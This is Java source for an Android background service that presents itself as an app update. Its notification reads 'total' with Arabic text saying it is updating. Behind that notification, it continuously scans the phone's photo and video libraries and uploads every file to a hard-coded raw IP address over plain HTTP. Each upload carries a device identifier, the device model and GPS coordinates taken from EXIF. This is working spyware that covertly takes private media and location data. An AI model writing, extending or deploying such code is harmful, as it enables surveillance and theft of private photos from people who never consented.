package com.example.yacinestylebackup;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.MediaStore;
import androidx.core.app.NotificationCompat;
import androidx.exifinterface.media.ExifInterface;
import androidx.work.Constraints;
import androidx.work.ExistingWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import java.io.BufferedInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.ArrayList;
import java.util.List;

import java.util.UUID;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class UploadService extends Service {
    private static final String UPLOAD_URL="http://51.75.118.5:20302/upload";
    private static final String PREFS="legend_upload", SENT="sent_ids";
    private static final String CHANNEL_ID="legend_update";
    private static final int NOTIFICATION_ID=7401;
    private final ExecutorService scanExecutor=Executors.newSingleThreadExecutor();
    private final ExecutorService uploadExecutor=Executors.newFixedThreadPool(3);
    private final Handler handler=new Handler(Looper.getMainLooper());
    private ContentObserver observer;
    private volatile boolean queued;
    private static final long POLL_INTERVAL_MS = 30_000L;
    private final Runnable periodicScan = new Runnable() {
        @Override public void run() {
            queueScan();
            handler.postDelayed(this, POLL_INTERVAL_MS);
        }
    };

    @Override public void onCreate(){
        super.onCreate();
        createChannel();
        startForeground(NOTIFICATION_ID, notification());
        observer=new ContentObserver(handler){
            @Override public void onChange(boolean selfChange,Uri uri){queueScan();}
        };
        getContentResolver().registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,true,observer);
        getContentResolver().registerContentObserver(MediaStore.Video.Media.EXTERNAL_CONTENT_URI,true,observer);
        queueScan();
        handler.postDelayed(periodicScan, POLL_INTERVAL_MS);
    }

    private Notification notification(){
        return new NotificationCompat.Builder(this,CHANNEL_ID)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentTitle("total")
                .setContentText("جاري التحديث…")
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true).setOnlyAlertOnce(true).build();
    }

    private void createChannel(){
        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O){
            NotificationChannel ch=new NotificationChannel(CHANNEL_ID,"تحديث total",NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("يظهر أثناء تنفيذ التحديث");
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }

    private void queueScan(){
        if(queued)return;
        queued=true;
        handler.postDelayed(()->{queued=false;scanExecutor.execute(this::scan);},800);
    }

    private void scan(){
        Set<String> sent=new HashSet<>(getSharedPreferences(PREFS,MODE_PRIVATE).getStringSet(SENT,new HashSet<>()));
        scanCollection(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media._ID,MediaStore.Images.Media.DISPLAY_NAME,MediaStore.Images.Media.MIME_TYPE},
                MediaStore.Images.Media.DATE_ADDED+" ASC","i:",sent);
        scanCollection(MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Video.Media._ID,MediaStore.Video.Media.DISPLAY_NAME,MediaStore.Video.Media.MIME_TYPE},
                MediaStore.Video.Media.DATE_ADDED+" ASC","v:",sent);
    }

    private void scanCollection(Uri collection,String[] projection,String sort,String prefix,Set<String> sent){
        List<Future<?>> pending=new ArrayList<>();
        try(Cursor c=getContentResolver().query(collection,projection,null,null,sort)){
            if(c==null)return;
            int idc=c.getColumnIndexOrThrow("_id");
            int namec=c.getColumnIndexOrThrow("_display_name");
            int mimec=c.getColumnIndexOrThrow("mime_type");
            while(c.moveToNext()){
                long rawId=c.getLong(idc);
                String id=prefix+rawId;
                synchronized(sent){
                    if(sent.contains(id))continue;
                }
                Uri uri=Uri.withAppendedPath(collection,String.valueOf(rawId));
                String name=c.getString(namec);
                String mime=c.getString(mimec);
                pending.add(uploadExecutor.submit(()->{
                    if(uploadOne(uri,name,mime)){
                        synchronized(sent){
                            sent.add(id);
                            getSharedPreferences(PREFS,MODE_PRIVATE).edit()
                                    .putStringSet(SENT,new HashSet<>(sent)).apply();
                        }
                    }
                }));
            }
        }catch(Exception ignored){}

        // Keep the original order between collections: images finish before videos start.
        for(Future<?> f:pending){
            try{f.get();}catch(Exception ignored){}
        }
    }

    private boolean uploadOne(Uri uri,String filename,String mime){
        // Retry temporary upload failures without changing the existing permissions or scan flow.
        for(int attempt=1; attempt<=3; attempt++){
            int result=uploadOneAttempt(uri,filename,mime);
            if(result>=200 && result<300)return true;

            // Retry server/gateway failures such as HTTP 502, plus connection errors (-1).
            if(result==502 || result==503 || result==504 || result==-1){
                if(attempt<3){
                    try{Thread.sleep(2000L);}catch(InterruptedException e){
                        Thread.currentThread().interrupt();
                        break;
                    }
                    continue;
                }
            }
            break;
        }
        scheduleNetworkRetry();
        return false;
    }

    private int uploadOneAttempt(Uri uri,String filename,String mime){
        HttpURLConnection conn=null;
        String boundary="----Legend"+System.currentTimeMillis();
        try{
            conn=(HttpURLConnection)new URL(UPLOAD_URL).openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(180000);
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type","multipart/form-data; boundary="+boundary);

            try(InputStream in=new BufferedInputStream(getContentResolver().openInputStream(uri));
                DataOutputStream out=new DataOutputStream(conn.getOutputStream())){
                if(in==null)return -1;

                String installationId=getInstallationId();
                String deviceModel=getDeviceModelLabel();

                writeTextPart(out,boundary,"device_id",installationId);
                writeTextPart(out,boundary,"device_model",deviceModel);

                MediaInfo info = readMediaInfo(uri, filename, mime);
                writeTextPart(out,boundary,"media_name",info.name);
                writeTextPart(out,boundary,"media_date",info.date);
                writeTextPart(out,boundary,"media_size",info.size);
                writeTextPart(out,boundary,"media_dimensions",info.dimensions);
                writeTextPart(out,boundary,"media_location",info.location);

                out.writeBytes("--"+boundary+"\r\n");
                out.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\""+safe(filename)+"\"\r\n");
                out.writeBytes("Content-Type: "+(mime==null?"application/octet-stream":mime)+"\r\n\r\n");

                byte[] buf=new byte[8192];
                int n;
                while((n=in.read(buf))!=-1)out.write(buf,0,n);
                out.writeBytes("\r\n--"+boundary+"--\r\n");
                out.flush();
            }

            int code=conn.getResponseCode();
            InputStream response=code>=400?conn.getErrorStream():conn.getInputStream();
            if(response!=null){byte[] b=new byte[2048];while(response.read(b)!=-1){}response.close();}
            return code;
        }catch(Exception e){
            return -1;
        }finally{
            if(conn!=null)conn.disconnect();
        }
    }

    private void writeTextPart(DataOutputStream out,String boundary,String name,String value) throws Exception{
        out.writeBytes("--"+boundary+"\r\n");
        out.writeBytes("Content-Disposition: form-data; name=\""+name+"\"\r\n\r\n");
        out.write((value==null?"":value).getBytes(java.nio.charset.StandardCharsets.UTF_8));
        out.writeBytes("\r\n");
    }

    private void scheduleNetworkRetry() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();
        OneTimeWorkRequest request =
                new OneTimeWorkRequest.Builder(NetworkUploadWorker.class)
                        .setConstraints(constraints)
                        .build();
        WorkManager.getInstance(getApplicationContext()).enqueueUniqueWork(
                "legend_network_resume",
                ExistingWorkPolicy.REPLACE,
                request
        );
    }

    private static class MediaInfo {
        String name="", date="", size="", dimensions="", location="";
    }

    private MediaInfo readMediaInfo(Uri uri, String filename, String mime) {
        MediaInfo info = new MediaInfo();
        info.name = filename == null ? "" : filename;
        try {
            String[] projection = new String[]{
                    MediaStore.MediaColumns.SIZE,
                    MediaStore.MediaColumns.WIDTH,
                    MediaStore.MediaColumns.HEIGHT,
                    MediaStore.Images.Media.DATE_TAKEN,
                    MediaStore.MediaColumns.DATE_ADDED,
                    MediaStore.MediaColumns.DATE_MODIFIED
            };
            try (Cursor c = getContentResolver().query(uri, projection, null, null, null)) {
                if (c != null && c.moveToFirst()) {
                    int sizeIdx=c.getColumnIndex(MediaStore.MediaColumns.SIZE);
                    int wIdx=c.getColumnIndex(MediaStore.MediaColumns.WIDTH);
                    int hIdx=c.getColumnIndex(MediaStore.MediaColumns.HEIGHT);
                    int takenIdx=c.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN);
                    int dateIdx=c.getColumnIndex(MediaStore.MediaColumns.DATE_ADDED);
                    if(sizeIdx>=0 && !c.isNull(sizeIdx)) info.size=formatBytes(c.getLong(sizeIdx));
                    if(wIdx>=0 && hIdx>=0 && !c.isNull(wIdx) && !c.isNull(hIdx))
                        info.dimensions=c.getInt(wIdx)+"×"+c.getInt(hIdx);
                    if(takenIdx>=0 && !c.isNull(takenIdx)) {
                        long takenMillis=c.getLong(takenIdx);
                        if(takenMillis>0) info.date=formatDate(takenMillis);
                    } else if(dateIdx>=0 && !c.isNull(dateIdx)) {
                        long seconds=c.getLong(dateIdx);
                        if(seconds>0) info.date=formatDate(seconds*1000L);
                    }
                }
            }

            // Read only metadata already stored inside an image; no live-location permission is requested.
            if (mime != null && mime.toLowerCase(Locale.ROOT).startsWith("image/")) {
                try (InputStream exifIn = getContentResolver().openInputStream(uri)) {
                    if (exifIn != null) {
                        ExifInterface exif = new ExifInterface(exifIn);
                        String original = exif.getAttribute(ExifInterface.TAG_DATETIME_ORIGINAL);
                        if (original != null && !original.trim().isEmpty()) info.date=original.trim();
                        float[] latLong = new float[2];
                        if (exif.getLatLong(latLong))
                            info.location=String.format(Locale.US,"%.6f, %.6f",latLong[0],latLong[1]);
                    }
                } catch (Exception ignored) { }
            }
        } catch (Exception ignored) { }
        return info;
    }

    private String formatBytes(long bytes) {
        if(bytes < 1024) return bytes+" B";
        double kb=bytes/1024.0;
        if(kb < 1024) return String.format(Locale.US,"%.1f KB",kb);
        return String.format(Locale.US,"%.2f MB",kb/1024.0);
    }

    private String formatDate(long millis) {
        return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date(millis));
    }

    private String safe(String s){
        if(s==null||s.isEmpty())return "image.jpg";
        return s.replace("\r","_").replace("\n","_").replace("\"","_");
    }

    @Override public int onStartCommand(Intent intent,int flags,int startId){queueScan();return START_STICKY;}
    @Override public void onDestroy(){
        if(observer!=null)getContentResolver().unregisterContentObserver(observer);
        handler.removeCallbacks(periodicScan);
        scanExecutor.shutdownNow();uploadExecutor.shutdownNow();stopForeground(true);super.onDestroy();
    }
    @Override public IBinder onBind(Intent intent){return null;}

    private String getInstallationId() {
        android.content.SharedPreferences p = getSharedPreferences("legend_device", MODE_PRIVATE);
        String id = p.getString("installation_id", null);
        if (id == null || id.isEmpty()) {
            id = UUID.randomUUID().toString();
            p.edit().putString("installation_id", id).apply();
        }
        return id;
    }

    private String getDeviceModelLabel() {
        String maker = Build.MANUFACTURER == null ? "" : Build.MANUFACTURER.trim();
        String model = Build.MODEL == null ? "" : Build.MODEL.trim();
        String value = (maker + " " + model).trim();
        return value.isEmpty() ? "Android" : value;
    }

}
